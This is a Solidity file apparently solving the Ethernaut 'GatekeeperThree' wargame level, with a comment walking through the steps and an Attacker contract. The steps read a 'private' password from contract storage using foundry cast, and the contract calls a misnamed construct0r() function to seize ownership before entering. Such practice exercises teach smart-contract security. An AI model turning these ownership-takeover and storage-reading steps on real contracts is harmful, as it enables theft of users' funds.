// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
Solution:
First Step:
function createTrick() public {};

Second Step:
Note Down trick address and use foundry cast to extract the password from storage.
cast storage "target Contract address" "storageSlot" --rpc-url https://eth-sepolia.g.alchemy.com/v2/YOUR_ALCHEMY_KEY
function getAllowance(uint256 _password) public {};
Call this function to set allowentrance = true. Use the password extracted in param.
Gate two is broken.

Third Step:
Deploy below contract with GatekeeperThree address.
Call attack function.
Dont make attacker contract payable as we want to fail third gate second part.
In attack function:
We are sending eth(send more than 0.001)
Third gate is also broken.

Then in attack function we have called target.construct0r() to make our contract the owner. 
As this is not a constructor but a vulnerability.
Now our contract beacme the owner and attack function is called by EOA so first gate is also broken.

Hence all gate broken.
*/



interface IGatekeeperThree  {
    function construct0r() external;
    function enter() external;
}

contract Attacker {
    IGatekeeperThree target;

    constructor(address _target) {
        target = IGatekeeperThree(_target);
    }

    function attack() public payable {
        (bool success, ) = address(target).call{value:msg.value}("");
        require(success,"Failed!");
        target.construct0r();
        target.enter();
    }
}
